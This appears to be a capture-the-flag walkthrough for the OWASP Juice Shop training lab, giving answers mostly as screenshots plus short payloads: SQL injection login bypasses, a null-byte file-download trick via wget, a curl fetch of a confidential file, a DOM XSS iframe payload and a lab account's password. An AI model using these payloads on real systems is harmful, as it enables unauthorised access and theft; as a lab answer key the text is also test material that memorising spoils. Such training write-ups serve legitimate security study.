# OWASP Juice Shop

## :motorway: Let's go on an adventure!

### #1 **What's the Administrator's email address?**

![](<../../.gitbook/assets/Screenshot from 2020-08-30 17-18-39.png>)

### #2 **What paramater is used for searching?**

![](<../../.gitbook/assets/Screenshot from 2020-08-30 17-13-32.png>)

### #3 **What show does Jim reference in his review?**

```
Star Trek
```

![](<../../.gitbook/assets/Screenshot from 2020-08-30 17-17-20.png>)

## :syringe: Inject the juice

### **#1 Log into the administrator account!**

```
' OR 1 = 1 --
```

### #2 **Log into the Bender account!**

```
bender@juice-sh.op' --
```

## :unlock: Who broke my lock?!

### #1 Bruteforce the Administrator account's password!

![](<../../.gitbook/assets/Screenshot from 2020-08-30 17-45-01.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-30 17-46-28.png>)

### #2 Reset Jim's password!

![](<../../.gitbook/assets/Screenshot from 2020-08-30 17-50-45.png>)

## AH! Don't look!

### #1 Access the Confidential Document!

```bash
curl http://10.10.184.117/ftp/acquisitions.md
```

![](<../../.gitbook/assets/Screenshot from 2020-08-30 21-36-20.png>)

### #2 Log into MC SafeSearch's account!

```
mc.safesearch@juice-sh.op
Mr. N00dles
```

### #3 Download the Backup file!

```
wget 'http://10.10.184.117/ftp/package.json.bak%2500.md'
```

![](<../../.gitbook/assets/Screenshot from 2020-08-30 21-03-14.png>)

## Who's flying this thing?

### #1 Access the administration page!

![](<../../.gitbook/assets/Screenshot from 2020-08-30 21-31-30.png>)

### #2 View another user's shopping basket!

![](<../../.gitbook/assets/Screenshot from 2020-08-30 21-26-31.png>)

### #3 Remove all 5-star reviews!

![](<../../.gitbook/assets/Screenshot from 2020-08-30 21-33-10.png>)

## Where did that come from?

### #1 Perform a DOM XSS!

```
<iframe src="javascript:alert(`xss`)"> 
```

![](<../../.gitbook/assets/Screenshot from 2020-08-30 21-52-51.png>)

### #2 Perform a persistent XSS!

![](<../../.gitbook/assets/Screenshot from 2020-08-30 21-55-05.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-30 21-55-48.png>)

### #3 Perform a reflected XSS!

![](<../../.gitbook/assets/Screenshot from 2020-08-30 21-51-52.png>)

## Exploration!

### #1 **Have fun!**

![](<../../.gitbook/assets/Screenshot from 2020-08-30 22-03-06.png>)
